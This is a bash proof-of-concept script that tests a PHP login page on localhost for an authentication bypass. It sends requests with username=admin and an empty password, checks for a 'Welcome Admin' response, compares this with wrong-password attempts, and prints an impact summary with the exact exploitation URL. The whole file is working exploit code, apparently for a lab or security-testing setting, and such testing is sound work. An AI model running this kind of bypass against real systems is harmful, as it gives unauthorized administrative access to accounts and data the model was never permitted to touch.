#!/bin/bash

# POC: Authentication Bypass via Empty Password Parameter
# This script demonstrates that providing an empty password parameter bypasses authentication

TARGET="http://localhost:3000"
ENDPOINT="/index.php"

echo "=========================================="
echo "POC: Authentication Bypass via Empty Password"
echo "=========================================="
echo ""

echo "[*] Target: ${TARGET}${ENDPOINT}"
echo ""

echo "[TEST 1] Attempting authentication with empty password (password=)"
echo "---"
RESPONSE1=$(curl -s -i "${TARGET}${ENDPOINT}?username=admin&password=")
HTTP_CODE1=$(echo "$RESPONSE1" | head -n1)
BODY1=$(echo "$RESPONSE1" | grep -A5 "Welcome Admin\|Oh Sorry")

echo "Request: GET ${ENDPOINT}?username=admin&password="
echo "HTTP Response: $HTTP_CODE1"
echo "Body excerpt:"
echo "$BODY1"
echo ""

if echo "$RESPONSE1" | grep -q "Welcome Admin"; then
    echo "[✓] VULNERABILITY CONFIRMED: Empty password bypasses authentication!"
    echo "[✓] Successfully authenticated as admin with empty password"
    VULN_FOUND=1
else
    echo "[✗] Authentication failed with empty password"
    VULN_FOUND=0
fi

echo ""
echo "[TEST 2] Attempting authentication with wrong password for comparison"
echo "---"
RESPONSE2=$(curl -s -i "${TARGET}${ENDPOINT}?username=admin&password=wrongpass")
BODY2=$(echo "$RESPONSE2" | grep -A5 "Welcome Admin\|Oh Sorry")

echo "Request: GET ${ENDPOINT}?username=admin&password=wrongpass"
echo "Body excerpt:"
echo "$BODY2"

if echo "$RESPONSE2" | grep -q "Oh Sorry"; then
    echo "[✓] Wrong password correctly rejected"
else
    echo "[!] Unexpected response for wrong password"
fi

echo ""
echo "[TEST 3] Attempting authentication with actual password value"
echo "---"
RESPONSE3=$(curl -s -i "${TARGET}${ENDPOINT}?username=admin&password=test123")
BODY3=$(echo "$RESPONSE3" | grep -A5 "Welcome Admin\|Oh Sorry")

echo "Request: GET ${ENDPOINT}?username=admin&password=test123"
echo "Body excerpt:"
echo "$BODY3"

if echo "$RESPONSE3" | grep -q "Oh Sorry"; then
    echo "[✓] Random password correctly rejected"
else
    echo "[!] Unexpected response for test password"
fi

echo ""
echo "=========================================="
echo "RESULTS SUMMARY"
echo "=========================================="

if [ $VULN_FOUND -eq 1 ]; then
    echo "[CRITICAL] Authentication Bypass Vulnerability Confirmed!"
    echo ""
    echo "Impact:"
    echo "  - Complete authentication bypass without valid credentials"
    echo "  - Unauthorized admin access using password= (empty value)"
    echo "  - Trivially exploitable - no special tools required"
    echo ""
    echo "Exploitation:"
    echo "  Simply access: ${TARGET}${ENDPOINT}?username=admin&password="
    echo ""
    exit 0
else
    echo "[INFO] Vulnerability not confirmed"
    exit 1
fi